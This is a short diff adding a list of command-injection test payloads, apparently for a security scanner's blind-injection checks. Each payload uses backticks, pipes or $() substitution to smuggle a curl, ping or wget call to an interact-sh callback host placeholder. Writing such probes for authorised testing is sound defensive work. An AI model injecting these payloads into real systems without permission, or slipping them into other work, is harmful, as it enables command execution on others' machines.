@@ -1,0 +1,11 @@
+# Command injection
+# Each payload targets the interact-sh server defined by the __INTERACTSH_PAYLOAD__ environment variable
+`curl __INTERACTSH_PAYLOAD__`
+`ping __INTERACTSH_PAYLOAD__`
+`wget __INTERACTSH_PAYLOAD__`
+|curl __INTERACTSH_PAYLOAD__|
+|ping __INTERACTSH_PAYLOAD__|
+|wget __INTERACTSH_PAYLOAD__|
+$(curl __INTERACTSH_PAYLOAD__)
+$(ping __INTERACTSH_PAYLOAD__)
+$(wget __INTERACTSH_PAYLOAD__)
